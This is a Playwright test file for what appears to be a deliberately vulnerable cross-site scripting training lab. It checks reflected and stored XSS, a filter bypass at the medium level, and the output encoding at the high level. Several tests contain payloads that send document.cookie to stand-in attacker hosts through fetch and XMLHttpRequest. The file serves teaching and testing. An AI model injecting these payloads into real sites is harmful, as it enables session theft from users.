const { test } = require("@playwright/test");
const { openLab, setLevel, expectDone, isDone, clearObjective, expect } = require("./helpers");

const search = async (page, q) => { await page.fill("#search-q", q); await page.click("#search-form button"); };
const post = async (page, msg) => { await page.fill("#gb-msg", msg); await page.click("#gb-form button[type=submit]"); };

test.describe("Cross-site scripting", () => {
  test("Low: reflected, stored and cookie theft", async ({ page }) => {
    await openLab(page, "xss");
    await setLevel(page, "low");
    await search(page, "<script>alert(1)</script>");
    await expectDone(page, "xss-reflected");

    await post(page, `<img src=x onerror="fetch('https://attacker.test/c?'+document.cookie)">`);
    await expectDone(page, "xss-stored");
    await expectDone(page, "xss-cookie");
    await expect(page.locator("#exfil-log")).toContainText("attacker.test/c?sessionid=");
  });

  test("Reflected payload delivered through the URL", async ({ page }) => {
    await page.goto("/index.html");
    await openLab(page, "xss", "?q=" + encodeURIComponent("<img src=x onerror=alert(document.cookie)>"));
    await expectDone(page, "xss-reflected");
    await expectDone(page, "xss-cookie");
  });

  test("XHR exfiltration is captured and never sent", async ({ page }) => {
    await openLab(page, "xss");
    await setLevel(page, "low");
    const leaked = [];
    page.on("request", (r) => { if (r.url().includes("attacker-xhr")) leaked.push(r.url()); });
    await search(page, `<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://attacker-xhr.example/c?'+document.cookie);x.send()">`);
    await expect(page.locator("#exfil-log")).toContainText("attacker-xhr.example");
    await expectDone(page, "xss-cookie");
    expect(leaked).toEqual([]);
  });

  test("Medium: script tags are stripped, event handlers are not", async ({ page }) => {
    await openLab(page, "xss");
    await setLevel(page, "medium");
    await search(page, "<script>alert(2)</script>");
    await page.waitForTimeout(300);
    expect(await isDone(page, "xss-medium")).toBe(false);
    await search(page, "<img src=x onerror=alert(3)>");
    await expectDone(page, "xss-medium");
  });

  test("High: output encoding renders payloads as text", async ({ page }) => {
    await openLab(page, "xss");
    await setLevel(page, "high");
    const before = await page.textContent("#exec-log");
    await search(page, "<img src=x onerror=alert(4)>");
    await post(page, "<img src=x onerror=alert(5)>");
    await page.waitForTimeout(500);
    await expect(page.locator("#gb-list")).toContainText("<img src=x onerror=alert(5)>");
    expect(await page.textContent("#exec-log")).toBe(before);
    await page.evaluate(() => window.alert("from the console"));
    expect(await isDone(page, "xss-reflected")).toBe(false);
  });
});
